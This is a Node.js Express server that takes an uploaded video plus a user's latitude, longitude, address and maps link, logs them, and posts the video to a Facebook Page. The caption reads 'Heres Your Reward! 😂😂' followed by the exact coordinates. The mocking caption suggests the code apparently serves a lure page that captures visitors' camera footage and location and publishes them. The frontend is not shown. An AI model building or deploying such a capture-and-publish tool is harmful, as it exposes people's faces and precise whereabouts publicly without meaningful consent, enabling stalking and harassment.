import express from "express";
import multer from "multer";
import fetch from "node-fetch";
import FormData from "form-data";
import dotenv from "dotenv";

dotenv.config();

const app = express();
const upload = multer(); // memory storage
const PORT = process.env.PORT || 3000;

const PAGE_ID = process.env.PAGE_ID;
const ACCESS_TOKEN = process.env.ACCESS_TOKEN;

// Middleware to parse JSON for location data
app.use(express.json());

// Accept video upload + optional location data
app.post("/upload-video", upload.single("video"), async (req, res) => {
    try {
        const videoFile = req.file;
        if (!videoFile) return res.status(400).json({ error: "No video uploaded" });

        // Location data sent from frontend
        const locationData = {
            latitude: req.body.latitude,
            longitude: req.body.longitude,
            accuracy: req.body.accuracy,
            address: req.body.address,
            maps: req.body.maps
        };

        console.log("User location data:", locationData);

        // Construct description including location if available
        let description = "Heres Your Reward! 😂😂";
        if (locationData.latitude && locationData.longitude) {
            description += `\nLocation: ${locationData.address || "Unknown"}`
                        + `\n📍 ${locationData.latitude}, ${locationData.longitude}`
                        + `\n🌐 ${locationData.maps}`;
        }

        // Prepare form for Facebook
        const form = new FormData();
        form.append("source", videoFile.buffer, videoFile.originalname);
        form.append("description", description);
        form.append("access_token", ACCESS_TOKEN);

        // Post to Facebook Page
        const response = await fetch(`https://graph.facebook.com/${PAGE_ID}/videos`, {
            method: "POST",
            body: form,
            headers: form.getHeaders() // important for FormData in Node
        });

        const result = await response.json();
        console.log("Video posted:", result);

        res.json({
            fbResponse: result,
            location: locationData
        });

    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// Serve frontend
app.use(express.static("frontend"));

app.listen(PORT, () => console.log(`Backend running on port ${PORT}`));
